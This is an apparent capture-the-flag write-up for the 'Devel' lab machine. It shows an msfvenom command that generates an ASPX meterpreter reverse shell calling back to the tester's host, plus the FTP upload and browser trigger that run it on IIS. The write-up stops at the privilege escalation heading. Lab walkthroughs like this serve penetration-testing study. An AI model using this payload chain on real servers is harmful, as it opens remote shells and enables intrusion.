# Devel

> Nashia Holloway | May 19th, 2020

## Enumeration

**10.10.10.5**

FTP and IIS7 are running on ports 21 and 80 respectively. Nothing of interest on the FTP server. There's not much we can do.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.46 LPORT=1234 -f aspx > shell.aspx
```

## Initial Access

This creates webshell we can access with a meterpreter listener. On the FTP server:

```
put ./shell.aspx
```

Navigate to `10.10.10.5/shell.aspx` to spawn the shell.

## Privilege Escalation

We don't have access to the `babis` user to get the user flag, so we'll try to privesc and get both user and root at the same time.
